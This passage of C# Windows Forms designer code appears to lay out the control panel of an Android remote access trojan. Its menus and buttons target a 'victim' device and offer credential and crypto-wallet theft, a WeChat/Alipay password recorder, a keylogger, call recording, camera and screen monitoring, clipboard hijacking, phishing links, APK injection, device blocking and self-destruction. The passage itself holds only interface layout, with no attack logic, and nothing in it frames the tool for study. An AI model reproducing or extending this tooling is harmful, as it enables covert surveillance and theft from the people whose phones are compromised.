		this.ScreenReaderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ScreenReaderToolStripMenuItem.Image");
		this.ScreenReaderToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ScreenReaderToolStripMenuItem.Name = "ScreenReaderToolStripMenuItem";
		this.ScreenReaderToolStripMenuItem.Size = new System.Drawing.Size(229, 42);
		this.ScreenReaderToolStripMenuItem.Text = "Screen Reader v3";
		this.ToolStripSeparator3.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator3.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator3.Name = "ToolStripSeparator3";
		this.ToolStripSeparator3.Size = new System.Drawing.Size(153, 6);
		this.AdminToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RequestAdminRightsToolStripMenuItem, this.LockScreenToolStripMenuItem, this.ToolStripMenuItem2 });
		this.AdminToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.AdminToolStripMenuItem.Name = "AdminToolStripMenuItem";
		this.AdminToolStripMenuItem.Size = new System.Drawing.Size(156, 24);
		this.AdminToolStripMenuItem.Text = "Victim Admin";
		this.RequestAdminRightsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.RequestAdminRightsToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.RequestAdminRightsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RequestAdminRightsToolStripMenuItem.Image");
		this.RequestAdminRightsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.RequestAdminRightsToolStripMenuItem.Name = "RequestAdminRightsToolStripMenuItem";
		this.RequestAdminRightsToolStripMenuItem.Size = new System.Drawing.Size(240, 42);
		this.RequestAdminRightsToolStripMenuItem.Text = "Sent Request Admin Rights";
		this.LockScreenToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.LockScreenToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.LockScreenToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("LockScreenToolStripMenuItem.Image");
		this.LockScreenToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.LockScreenToolStripMenuItem.Name = "LockScreenToolStripMenuItem";
		this.LockScreenToolStripMenuItem.Size = new System.Drawing.Size(240, 42);
		this.LockScreenToolStripMenuItem.Text = "Screen Lock Capture And Unlock";
		this.ToolStripMenuItem2.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem2.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem2.Image");
		this.ToolStripMenuItem2.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
		this.ToolStripMenuItem2.Size = new System.Drawing.Size(240, 42);
		this.ToolStripMenuItem2.Text = "Use Mobile On Background";
		this.ToolStripSeparator6.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator6.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator6.Name = "ToolStripSeparator6";
		this.ToolStripSeparator6.Size = new System.Drawing.Size(153, 6);
		this.ToolStripMenuItem4.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem4.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.ToolStripMenuItem5, this.ToolStripMenuItem6, this.ToolStripMenuItem7, this.ToolStripMenuItem8, this.ToolStripMenuItem9, this.ToolStripMenuItem10 });
		this.ToolStripMenuItem4.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
		this.ToolStripMenuItem4.Size = new System.Drawing.Size(156, 24);
		this.ToolStripMenuItem4.Text = "Victim Tools";
		this.ToolStripMenuItem5.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem5.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem5.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem5.Image");
		this.ToolStripMenuItem5.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
		this.ToolStripMenuItem5.Size = new System.Drawing.Size(197, 42);
		this.ToolStripMenuItem5.Text = "Call Number";
		this.ToolStripMenuItem6.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem6.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem6.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem6.Image");
		this.ToolStripMenuItem6.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem6.Name = "ToolStripMenuItem6";
		this.ToolStripMenuItem6.Size = new System.Drawing.Size(197, 42);
		this.ToolStripMenuItem6.Text = "Download APK And Install";
		this.ToolStripMenuItem7.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem7.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem7.Image");
		this.ToolStripMenuItem7.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
		this.ToolStripMenuItem7.Size = new System.Drawing.Size(197, 42);
		this.ToolStripMenuItem7.Text = "Show Fake Messege";
		this.ToolStripMenuItem8.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem8.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem8.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem8.Image");
		this.ToolStripMenuItem8.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem8.Name = "ToolStripMenuItem8";
		this.ToolStripMenuItem8.Size = new System.Drawing.Size(197, 42);
		this.ToolStripMenuItem8.Text = "Clipboard Capture";
		this.ToolStripMenuItem9.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem9.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem9.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem9.Image");
		this.ToolStripMenuItem9.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem9.Name = "ToolStripMenuItem9";
		this.ToolStripMenuItem9.Size = new System.Drawing.Size(197, 42);
		this.ToolStripMenuItem9.Text = "Open Physhing Link";
		this.ToolStripMenuItem10.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem10.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem10.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem10.Image");
		this.ToolStripMenuItem10.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem10.Name = "ToolStripMenuItem10";
		this.ToolStripMenuItem10.Size = new System.Drawing.Size(197, 42);
		this.ToolStripMenuItem10.Text = "Injection With All Apk";
		this.ToolStripSeparator5.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator5.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator5.Name = "ToolStripSeparator5";
		this.ToolStripSeparator5.Size = new System.Drawing.Size(153, 6);
		this.ExtraToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.ExtraToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.NotificationListnerToolStripMenuItem, this.CallsListnerToolStripMenuItem, this.PhoneInformationToolStripMenuItem });
		this.ExtraToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.ExtraToolStripMenuItem.Name = "ExtraToolStripMenuItem";
		this.ExtraToolStripMenuItem.Size = new System.Drawing.Size(156, 24);
		this.ExtraToolStripMenuItem.Text = "Victim Extra";
		this.NotificationListnerToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.NotificationListnerToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.NotificationListnerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("NotificationListnerToolStripMenuItem.Image");
		this.NotificationListnerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.NotificationListnerToolStripMenuItem.Name = "NotificationListnerToolStripMenuItem";
		this.NotificationListnerToolStripMenuItem.Size = new System.Drawing.Size(220, 42);
		this.NotificationListnerToolStripMenuItem.Text = "Victim Notification Listner";
		this.CallsListnerToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.CallsListnerToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.CallsListnerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CallsListnerToolStripMenuItem.Image");
		this.CallsListnerToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.CallsListnerToolStripMenuItem.Name = "CallsListnerToolStripMenuItem";
		this.CallsListnerToolStripMenuItem.Size = new System.Drawing.Size(220, 42);
		this.CallsListnerToolStripMenuItem.Text = "Victim Calls Listner And Recorder";
		this.PhoneInformationToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.PhoneInformationToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.PhoneInformationToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("PhoneInformationToolStripMenuItem.Image");
		this.PhoneInformationToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.PhoneInformationToolStripMenuItem.Name = "PhoneInformationToolStripMenuItem";
		this.PhoneInformationToolStripMenuItem.Size = new System.Drawing.Size(220, 42);
		this.PhoneInformationToolStripMenuItem.Text = "Victim Phone information";
		this.ToolStripSeparator7.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator7.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator7.Name = "ToolStripSeparator7";
		this.ToolStripSeparator7.Size = new System.Drawing.Size(153, 6);
		this.ToolStripMenuItem13.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem13.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.ToolStripMenuItem16, this.ToolStripMenuItem17, this.ToolStripMenuItem18, this.ToolStripMenuItem11 });
		this.ToolStripMenuItem13.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem13.Name = "ToolStripMenuItem13";
		this.ToolStripMenuItem13.Size = new System.Drawing.Size(156, 24);
		this.ToolStripMenuItem13.Text = "Victim Connection";
		this.ToolStripMenuItem16.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem16.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem16.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem16.Image");
		this.ToolStripMenuItem16.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem16.Name = "ToolStripMenuItem16";
		this.ToolStripMenuItem16.Size = new System.Drawing.Size(221, 42);
		this.ToolStripMenuItem16.Text = "Restart Victim Connection";
		this.ToolStripMenuItem17.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem17.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem17.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem17.Image");
		this.ToolStripMenuItem17.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem17.Name = "ToolStripMenuItem17";
		this.ToolStripMenuItem17.Size = new System.Drawing.Size(221, 42);
		this.ToolStripMenuItem17.Text = "Block Victim Device";
		this.ToolStripMenuItem18.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem18.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem18.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem18.Image");
		this.ToolStripMenuItem18.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem18.Name = "ToolStripMenuItem18";
		this.ToolStripMenuItem18.Size = new System.Drawing.Size(221, 42);
		this.ToolStripMenuItem18.Text = "Disable Anti Killer Apk Booster";
		this.ToolStripMenuItem11.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem11.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem11.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem11.Image");
		this.ToolStripMenuItem11.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem11.Name = "ToolStripMenuItem11";
		this.ToolStripMenuItem11.Size = new System.Drawing.Size(221, 42);
		this.ToolStripMenuItem11.Text = "Self Destuction";
		this.ToolStripSeparator8.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator8.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator8.Name = "ToolStripSeparator8";
		this.ToolStripSeparator8.Size = new System.Drawing.Size(153, 6);
		this.KeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.KeyboardToolStripMenuItem.Name = "KeyboardToolStripMenuItem";
		this.KeyboardToolStripMenuItem.Size = new System.Drawing.Size(156, 24);
		this.KeyboardToolStripMenuItem.Text = "Crypto Wallet Stealer";
		this.ToolStripSeparator4.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator4.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator4.Name = "ToolStripSeparator4";
		this.ToolStripSeparator4.Size = new System.Drawing.Size(153, 6);
		this.ClientFolderToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.ClientFolderToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
		this.ClientFolderToolStripMenuItem.Size = new System.Drawing.Size(156, 24);
		this.ClientFolderToolStripMenuItem.Text = "Wechat/Aplipay Password Recorder";
		this.MonitorPanel.BackColor = System.Drawing.Color.Black;
		this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon19);
		this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon18);
		this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon17);
		this.MonitorPanel.Controls.Add(this.camerabtn);
		this.MonitorPanel.Controls.Add(this.accountbtn);
		this.MonitorPanel.Controls.Add(this.screenbtn);
		this.MonitorPanel.Controls.Add(this.callsbtn);
		this.MonitorPanel.Controls.Add(this.filebtn);
		this.MonitorPanel.Controls.Add(this.Hinfobtn);
		this.MonitorPanel.Controls.Add(this.HBlockbtn);
		this.MonitorPanel.Controls.Add(this.contactbtn);
		this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon4);
		this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon3);
		this.MonitorPanel.Controls.Add(this.Panel16);
		this.MonitorPanel.Controls.Add(this.micbtn);
		this.MonitorPanel.Controls.Add(this.screenreadbtn);
		this.MonitorPanel.Controls.Add(this.locationbtn);
		this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon6);
		this.MonitorPanel.Controls.Add(this.Panel20);
		this.MonitorPanel.Controls.Add(this.applicationsbtn);
		this.MonitorPanel.Controls.Add(this.keyloggerbtn);
		this.MonitorPanel.Controls.Add(this.DrakeUIButtonIcon5);
		this.MonitorPanel.Controls.Add(this.smsbtn);
		this.MonitorPanel.Dock = System.Windows.Forms.DockStyle.Right;
		this.MonitorPanel.Location = new System.Drawing.Point(754, 29);
		this.MonitorPanel.Margin = new System.Windows.Forms.Padding(2);
		this.MonitorPanel.Name = "MonitorPanel";
		this.MonitorPanel.Size = new System.Drawing.Size(311, 515);
		this.MonitorPanel.TabIndex = 36;
		this.MonitorPanel.Visible = false;
		this.DrakeUIButtonIcon19.CircleRectWidth = 30;
		this.DrakeUIButtonIcon19.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon19.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon19.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon19.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon19.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.Location = new System.Drawing.Point(121, 43);
		this.DrakeUIButtonIcon19.Name = "DrakeUIButtonIcon19";
		this.DrakeUIButtonIcon19.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon19.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon19.Size = new System.Drawing.Size(32, 25);
		this.DrakeUIButtonIcon19.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon19.StyleCustomMode = true;
		this.DrakeUIButtonIcon19.Symbol = 61633;
		this.DrakeUIButtonIcon19.SymbolSize = 30;
		this.DrakeUIButtonIcon19.TabIndex = 39;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon19, "Quick open link");
		this.DrakeUIButtonIcon18.CircleRectWidth = 30;
		this.DrakeUIButtonIcon18.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon18.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon18.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon18.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon18.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon18.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon18.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon18.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon18.Location = new System.Drawing.Point(83, 43);
		this.DrakeUIButtonIcon18.Name = "DrakeUIButtonIcon18";
		this.DrakeUIButtonIcon18.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon18.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon18.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon18.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon18.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon18.Size = new System.Drawing.Size(32, 25);
		this.DrakeUIButtonIcon18.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon18.StyleCustomMode = true;
		this.DrakeUIButtonIcon18.Symbol = 61606;
		this.DrakeUIButtonIcon18.SymbolSize = 30;
		this.DrakeUIButtonIcon18.TabIndex = 38;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon18, "Clipper");
		this.DrakeUIButtonIcon17.CircleRectWidth = 30;
		this.DrakeUIButtonIcon17.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon17.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon17.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon17.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon17.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon17.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon17.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon17.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon17.Location = new System.Drawing.Point(46, 43);
		this.DrakeUIButtonIcon17.Name = "DrakeUIButtonIcon17";
		this.DrakeUIButtonIcon17.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon17.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon17.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon17.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon17.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon17.Size = new System.Drawing.Size(32, 25);
		this.DrakeUIButtonIcon17.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon17.StyleCustomMode = true;
		this.DrakeUIButtonIcon17.Symbol = 61612;
		this.DrakeUIButtonIcon17.SymbolSize = 30;
		this.DrakeUIButtonIcon17.TabIndex = 37;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon17, "Cobra Browser");
		this.camerabtn.CircleRectWidth = 30;
		this.camerabtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.camerabtn.FillColor = System.Drawing.Color.Black;
		this.camerabtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.camerabtn.FillPressColor = System.Drawing.Color.Black;
		this.camerabtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.camerabtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.camerabtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.camerabtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.camerabtn.Location = new System.Drawing.Point(138, 10);
		this.camerabtn.Name = "camerabtn";
		this.camerabtn.RectColor = System.Drawing.Color.Black;
		this.camerabtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.camerabtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.camerabtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.camerabtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.camerabtn.Size = new System.Drawing.Size(32, 25);
		this.camerabtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.camerabtn.StyleCustomMode = true;
		this.camerabtn.Symbol = 61488;
		this.camerabtn.SymbolSize = 30;
		this.camerabtn.TabIndex = 19;
		this.notifiform.SetToolTip(this.camerabtn, "Camera Monitor");
		this.accountbtn.CircleRectWidth = 30;
		this.accountbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.accountbtn.FillColor = System.Drawing.Color.Black;
		this.accountbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.accountbtn.FillPressColor = System.Drawing.Color.Black;
		this.accountbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.accountbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.accountbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.accountbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.accountbtn.Location = new System.Drawing.Point(158, 43);
		this.accountbtn.Name = "accountbtn";
		this.accountbtn.RectColor = System.Drawing.Color.Black;
		this.accountbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.accountbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.accountbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.accountbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.accountbtn.Size = new System.Drawing.Size(32, 25);
		this.accountbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.accountbtn.StyleCustomMode = true;
		this.accountbtn.Symbol = 62004;
		this.accountbtn.SymbolSize = 30;
		this.accountbtn.TabIndex = 21;
		this.notifiform.SetToolTip(this.accountbtn, "Victim Accounts");
		this.screenbtn.CircleRectWidth = 30;
		this.screenbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.screenbtn.FillColor = System.Drawing.Color.Black;
		this.screenbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.screenbtn.FillPressColor = System.Drawing.Color.Black;
		this.screenbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.screenbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.screenbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.screenbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.screenbtn.Location = new System.Drawing.Point(100, 10);
		this.screenbtn.Name = "screenbtn";
		this.screenbtn.RectColor = System.Drawing.Color.Black;
		this.screenbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.screenbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.screenbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.screenbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.screenbtn.Size = new System.Drawing.Size(32, 25);
		this.screenbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.screenbtn.StyleCustomMode = true;
		this.screenbtn.Symbol = 61707;
		this.screenbtn.SymbolSize = 30;
		this.screenbtn.TabIndex = 17;
		this.notifiform.SetToolTip(this.screenbtn, "Screen Monitor v3");
		this.callsbtn.CircleRectWidth = 30;
		this.callsbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.callsbtn.FillColor = System.Drawing.Color.Black;
		this.callsbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.callsbtn.FillPressColor = System.Drawing.Color.Black;
		this.callsbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.callsbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.callsbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.callsbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.callsbtn.Location = new System.Drawing.Point(233, 43);
		this.callsbtn.Name = "callsbtn";
		this.callsbtn.RectColor = System.Drawing.Color.Black;
		this.callsbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.callsbtn.RectHoverColor = System.Drawing.Color.White;
		this.callsbtn.RectPressColor = System.Drawing.Color.White;
		this.callsbtn.RectSelectedColor = System.Drawing.Color.White;
		this.callsbtn.Size = new System.Drawing.Size(32, 25);
		this.callsbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.callsbtn.StyleCustomMode = true;
		this.callsbtn.Symbol = 61589;
		this.callsbtn.SymbolSize = 30;
		this.callsbtn.TabIndex = 22;
		this.notifiform.SetToolTip(this.callsbtn, "Calls Manager");
		this.filebtn.CircleRectWidth = 30;
		this.filebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.filebtn.FillColor = System.Drawing.Color.Black;
		this.filebtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.filebtn.FillPressColor = System.Drawing.Color.Black;
		this.filebtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.filebtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.filebtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.filebtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.filebtn.Location = new System.Drawing.Point(63, 10);
		this.filebtn.Name = "filebtn";
		this.filebtn.RectColor = System.Drawing.Color.Black;
		this.filebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.filebtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.filebtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.filebtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.filebtn.Size = new System.Drawing.Size(32, 25);
		this.filebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.filebtn.StyleCustomMode = true;
		this.filebtn.Symbol = 61564;
		this.filebtn.SymbolSize = 30;
		this.filebtn.TabIndex = 17;
		this.notifiform.SetToolTip(this.filebtn, "Victim File Manager");
		this.Hinfobtn.CircleRectWidth = 30;
		this.Hinfobtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Hinfobtn.FillColor = System.Drawing.Color.Black;
		this.Hinfobtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.Hinfobtn.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.Hinfobtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Hinfobtn.Location = new System.Drawing.Point(83, 74);
		this.Hinfobtn.Name = "Hinfobtn";
		this.Hinfobtn.RectColor = System.Drawing.Color.Black;
		this.Hinfobtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Hinfobtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.Hinfobtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.Hinfobtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.Hinfobtn.Size = new System.Drawing.Size(32, 25);
		this.Hinfobtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Hinfobtn.StyleCustomMode = true;
		this.Hinfobtn.Symbol = 61530;
		this.Hinfobtn.SymbolSize = 30;
		this.Hinfobtn.TabIndex = 31;
		this.notifiform.SetToolTip(this.Hinfobtn, "Victim phone information");
		this.HBlockbtn.CircleRectWidth = 30;
		this.HBlockbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.HBlockbtn.FillColor = System.Drawing.Color.Black;
		this.HBlockbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.HBlockbtn.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.HBlockbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.HBlockbtn.Location = new System.Drawing.Point(271, 74);
		this.HBlockbtn.Name = "HBlockbtn";
		this.HBlockbtn.RectColor = System.Drawing.Color.Black;
		this.HBlockbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.HBlockbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
